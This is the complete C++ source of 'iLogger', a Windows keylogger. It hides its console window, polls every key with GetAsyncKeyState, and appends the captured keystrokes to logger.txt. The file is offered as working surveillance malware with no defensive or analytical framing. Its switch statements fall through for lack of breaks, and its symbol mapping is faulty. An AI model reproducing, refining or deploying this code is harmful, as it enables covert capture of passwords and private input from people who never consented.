
/* Author: Zakaria Abushima
 * iLogger: This is the main console application
 * Date: 02/06/2016 */

#include "stdafx.h"

#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void loginput();
void hideConsole();

// Main function
int main()
{
	hideConsole();
	loginput();
	return 0;

}

// function that logs all input
void loginput() {

	char key;

	for (;;) {
		for (key = 8; key <= 222; key++) {

			// Async function that checks if any key has been pressed on keyboard
			if (GetAsyncKeyState(key) == -32767) {

				ofstream write("logger.txt", ios::app);

				// Log letters, lower case, uppercase. Check if shift or caps lock is ON.
				if ((key > 64) && (key < 91) && (!(GetAsyncKeyState(0x10))) && ((GetKeyState(0x14)) == 0)) {
					key += 32;
					write << key;
					write.close();
					break;
				} else if ((key > 64) && (key < 91)) {
					write << key;
					write.close();
					break;
				}
				// handle numbers
				else if (key > 47 && key < 58 && (!GetAsyncKeyState(0x10))) {
					write << key;
					write.close();
				}
				else {

					// handle  signs 
					if (key > 32 && key < 58 && GetAsyncKeyState(0x10)) {
						switch (key) {
						case 48:
							write << ")";
						case 49:
							write << "(";
						case 50: 
							write << "*";
						case 51: 
							write << "&";
						case 52:
							write << "^";
						case 53:
							write << "%";
						case 54:
							write << "$";
						case 55:
							write << "£";
						case 56:
							write << '"';
						case 57:
							write << "!";
						}
						
					}
					else {
						// Switch statement handles  several unique keystrokers from keyboard and mouse
						switch (key) {
						case VK_LBUTTON: write << ""; // <MouseLeft>
						case VK_RBUTTON: write << ""; // <MouseRight>
						case VK_MBUTTON: write << ""; // <MouseMiddle>
						case VK_BACK: write << ""; // <Backspace>
						case VK_TAB: write << ""; // <Tab>
						case VK_CLEAR: write << ""; // <Clear>
						case VK_RETURN: write << "\n"; // <Enter>
						case VK_SHIFT: write << ""; // <Shift>
						case VK_CONTROL: write << ""; // <CTRL>
						case VK_ESCAPE: write << ""; // <ESC>
						case VK_DELETE: write << ""; // <Delete>
						case VK_SPACE: write << " "; // Space
						case 0x07: write << ""; // Undefined
						case 0x1A: write << ""; // Undefined
						default:
							write << "";
						}
					}

				}

			}

		}
	}

}

// function to hide console in background
void hideConsole() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

